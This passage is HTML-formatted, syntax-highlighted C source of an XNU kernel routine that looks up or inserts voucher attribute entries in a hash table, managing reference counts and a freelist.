class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;restart&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hash_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IV_HASH_VAL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_init_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;hash_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;].&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;while&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IV_HASH_END&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(!&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_free&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;break&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_next &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_next&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* found it? */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IV_HASH_END&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* only add reference on non-persistent value */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(!&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_persist&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* insert new entry in the table */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_freelist&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;IV_FREELIST_END &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* freelist empty */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_grow_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;goto&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;restart&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* take the entry off the freelist */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_freelist &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_next&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* initialize the new entry */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_free &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_persist &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;flag &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_VALUE_FLAGS_PERSIST&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;?&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;TRUE &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* insert the new entry in the proper hash chain */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_next &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;hash_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;].&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;hash_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;].&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* donated passed in ivac reference to new entry */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span 